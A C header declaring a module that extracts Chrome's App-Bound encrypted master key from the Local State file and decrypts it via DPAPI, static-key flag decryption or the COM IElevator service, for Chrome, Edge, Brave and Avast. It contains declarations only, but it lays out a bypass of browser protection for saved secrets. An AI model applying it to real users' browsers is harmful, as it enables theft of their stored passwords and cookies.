/*
 * appbound.h — Chrome App-Bound Encryption key decryption
 *
 * Chrome v120+ encrypts the master key with App-Bound Encryption,
 * which binds the key to the machine via COM IElevator service.
 * This module attempts multiple decryption strategies:
 *   1. Standard DPAPI (fallback for older Chrome / pre-App-Bound)
 *   2. App-Bound flag-based decryption (flags 1/2/3/32)
 *   3. COM IElevator (requires running chrome.exe)
 */

#ifndef APPBOUND_H
#define APPBOUND_H

#include <stddef.h>
#include <stdint.h>

/*
 * Browser types with corresponding COM GUIDs for IElevator.
 */
typedef enum {
    APPBOUND_CHROME = 0,
    APPBOUND_EDGE   = 1,
    APPBOUND_BRAVE  = 2,
    APPBOUND_AVAST  = 3,
} AppBoundBrowser;

/*
 * Extract the App-Bound encrypted key from Local State JSON.
 * Looks for "app_bound_encrypted_key" field (base64).
 * Returns decoded bytes in `out`, sets `out_len`. Returns 0 on success.
 */
int appbound_extract_key(const char *json, size_t json_len,
                          unsigned char *out, size_t out_max,
                          size_t *out_len);

/*
 * Decrypt an App-Bound encrypted key blob.
 * Tries multiple strategies:
 *   1. DPAPI on the raw blob (after stripping APPB prefix)
 *   2. Flag-based decryption (flags 1/2/3/32) using static keys
 *   3. COM IElevator if browser process is available
 *
 * `browser` selects the COM CLSID/IID for the target browser.
 * Returns 32-byte AES key in `key32`. Returns 0 on success.
 */
int appbound_decrypt(const unsigned char *encrypted_blob, size_t blob_len,
                      AppBoundBrowser browser,
                      unsigned char *key32);

/*
 * Try DPAPI decryption on an App-Bound key blob.
 * Skips the 4-byte "APPB" prefix, then calls CryptUnprotectData.
 * Returns decrypted key in `out`, sets `out_len`. Returns 0 on success.
 */
int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
                        unsigned char *out, size_t out_max,
                        size_t *out_len);

/*
 * Decrypt the App-Bound key using the Chrome COM IElevator interface.
 * This requires chrome.exe to be running (or started) for the RPC call.
 * Returns 32-byte AES key in `key32`. Returns 0 on success.
 */
int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
                          AppBoundBrowser browser,
                          unsigned char *key32);

/*
 * Combined key extraction + decryption from Local State JSON path.
 * Reads the file, extracts app_bound_encrypted_key, and decrypts it.
 * Returns 32-byte AES key in `key32`. Returns 0 on success.
 */
int appbound_get_key(const char *local_state_path,
                      AppBoundBrowser browser,
                      unsigned char *key32);

#endif /* APPBOUND_H */
